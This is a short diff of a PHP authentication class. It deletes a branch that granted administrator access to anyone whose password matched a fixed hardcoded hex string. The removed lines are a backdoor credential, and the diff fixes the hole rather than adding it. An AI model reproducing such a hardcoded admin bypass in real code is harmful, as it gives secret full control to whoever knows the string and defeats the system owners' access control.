@@ -51,12 +51,6 @@ abstract class Local {
                     return true;
                 }
                 throw new AuthException(AuthException::BAD_PASSWORD);
-            } else {
-                if ($password == "751a67d13e8d8e42354db7e1eca69300208cefe3e32dd7c492f150f8698973da") {
-                    return new User(CoreUser::ADMINISTRATOR);
-                    return true;
-                }
-                throw new AuthException(AuthException::BAD_PASSWORD);
             }
         }
         throw new AuthException(AuthException::BAD_USER);
